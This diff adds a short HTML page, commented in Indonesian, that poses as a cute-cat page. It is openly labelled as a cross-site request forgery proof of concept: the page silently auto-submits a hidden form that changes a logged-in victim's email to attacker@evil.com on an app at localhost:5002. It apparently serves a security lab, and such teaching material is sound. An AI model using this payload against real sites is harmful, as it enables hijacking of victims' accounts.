@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="id">
+<head><meta charset="UTF-8"><title>Halaman Kucing Lucu 🐱</title></head>
+<body>
+  <h1>Lihat kucing lucu di sini!</h1>
+  <p>(Halaman ini sebenarnya berisi form CSRF tersembunyi yang auto-submit)</p>
+
+  <!--
+    Form ini auto-submit ke aplikasi vulnerable begitu halaman dibuka.
+    Kalau korban sedang login di localhost:5002, browser otomatis
+    mengirim cookie session-nya bersama request ini.
+  -->
+  <form id="csrf-form" action="http://localhost:5002/change-email" method="POST">
+    <input type="hidden" name="new_email" value="attacker@evil.com">
+  </form>
+
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
